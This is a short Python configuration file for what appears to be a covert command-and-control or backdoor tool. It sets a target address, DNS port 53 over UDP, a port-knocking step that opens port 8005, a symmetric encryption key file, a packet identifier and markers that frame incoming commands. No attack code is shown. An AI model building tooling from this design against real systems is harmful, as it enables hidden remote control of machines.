# Target IP
TARGET_IP = "192.168.0.8"
# Target port
TARGET_PORT = 53
# Protocol - Change to 1 to enable, 0 to disable. *Note: DNS uses UDP
PROTOCOL = {
    "UDP": 1,
    "TCP": 0,
}
# This port opens up when port knock successful
PORT_KNOCK_TARGET_PORT = 8005
# File to output most recent command data:
OUTPUT_FILE = "result.txt"


# Encryption key for symmetrical encryption
KEY = 'encryption.key'
# Packet Payload Identifier
IDENTIFIER = b"////"
# If the received command does not have these two keywords in it, then the message is ignored
COMMAND_START = "start["
COMMAND_END = "]end"
